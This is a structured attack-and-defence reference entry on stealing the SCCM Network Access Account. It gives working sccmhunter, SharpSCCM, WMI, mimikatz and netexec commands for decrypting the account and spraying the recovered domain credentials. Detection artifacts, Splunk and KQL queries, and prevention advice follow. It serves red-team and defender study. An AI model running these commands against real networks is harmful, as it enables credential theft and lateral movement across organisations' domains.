name: SCCM Network Access Account (NAA) Credential Extraction
description: The SCCM Network Access Account (NAA) is a domain account clients use to reach content when not domain-authenticated. Clients download it inside machine policy from the Management Point and store it DPAPI-encrypted in WMI/CIM (root\ccm\policy\machine or the CIM repository). A low-privilege attacker can request the policy from the MP and decrypt the NAA (sccmhunter get naa / SharpSCCM get naa), or read the legacy plaintext NAA from a client's WMI - yielding usable domain credentials.
notes:
=== VIA POLICY REQUEST (no admin on a client needed - CRED-1) ===
  # sccmhunter asks the MP for machine policy, pulls and decrypts the NAA blob:
  sccmhunter.py get naa -u <user> -p <password> -ip <ip>
  # SharpSCCM equivalent (registers a rogue device or uses current context):
  SharpSCCM.exe get naa
  SharpSCCM.exe get secrets -mp <mp_host> -sc <sitecode>

=== FROM A CLIENT (local admin / SYSTEM - CRED-2) ===
  # DPAPI-encrypted policy secrets live in WMI:
  SharpSCCM.exe local secrets                 # decrypts NAA, task-sequence, collection vars
  # Manual WMI read of the encrypted blobs:
  Get-WmiObject -Namespace root\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
  # Legacy plaintext NAA sometimes present in:
  #   root\ccm\policy\machine  or the OBJECT_LOCKS / CIM repository

=== USE THE CREDENTIALS ===
  # NAA is a domain account - spray / authenticate it:
  netexec smb <dc_ip> -u <naa_user> -p <naa_pass>
  # Often over-privileged (reused admin), enabling immediate lateral movement.

=== ALTERNATIVES ===
  mimikatz 'dpapi::...'          # manual DPAPI if you have the masterkey
  PXE media task-sequence vars   # another source of domain-join creds

examples.label: Request + decrypt NAA from the MP
Dump local policy secrets as SYSTEM

recommended.note: Locate the MP before requesting policy from it.
Distribution Points are another credential source.
GPP cPassword is a parallel source of stored domain creds.

defense.why_it_works: Clients must be able to obtain the NAA to fetch content, so the MP serves it inside machine policy, DPAPI-protected with a key the client (and therefore local SYSTEM) can derive. A rogue or registered device can request the same policy, and legacy sites stored the NAA in plaintext in WMI. The NAA is frequently a reused or over-privileged domain account.
defense.prerequisites: CRED-1: network access to the MP and the ability to request machine policy (a domain account, or an attacker-registered device). CRED-2: local admin/SYSTEM on an SCCM client.
defense.impact: Recovery of valid domain credentials (often over-privileged), enabling authentication, spraying, and lateral movement across the estate.
defense.detection: [MITRE T1555] New/unknown device records requesting machine policy from the MP; SharpSCCM default device names; WMI reads of CCM_NetworkAccessAccount; policy requests from hosts that are not managed clients.
defense.artifacts: MP IIS logs for policy requests (/ccm_system_windowsauth, CCM_POST); SMS_MP / MP_GetPolicy entries; Sysmon WMI (EventID 19-21) on CCM_Policy namespaces; new device registration in the SCCM console.
defense.splunk_spl:
index=windows (source="*W3SVC*" OR sourcetype=iis) cs_uri_stem="*ccm_system*" OR cs_uri_stem="*GetPolicy*"
| stats count by c_ip, cs_username, cs_uri_stem
| where count > 5
defense.sentinel_kql:
W3CIISLog
| where csUriStem has_any ("ccm_system", "GetPolicy", "SMS_MP")
| summarize Count=count() by cIP, csUserName, csUriStem, bin(TimeGenerated, 1h)
| where Count > 5
defense.prevention: Stop using an NAA where possible (use Enhanced HTTP + PKI so clients authenticate as themselves); if required, make the NAA a low-privilege account with no interactive logon and no admin rights; enable Enhanced HTTP and require PKI on MPs; monitor and approve device registrations; rotate the NAA and remove any legacy plaintext copies.

detections.name: SCCM machine-policy request from non-managed host (NAA theft)
detections.logic:
W3CIISLog
| where csUriStem has_any ("ccm_system", "GetPolicy")
| summarize Count=count() by cIP, csUserName, bin(TimeGenerated, 1h)
| where Count > 5
detections.false_positives: Newly imaged clients and re-registering devices request policy normally.
detections.tuning: Correlate requesting IP against the managed-client inventory; alert on source IPs that are not SCCM clients.
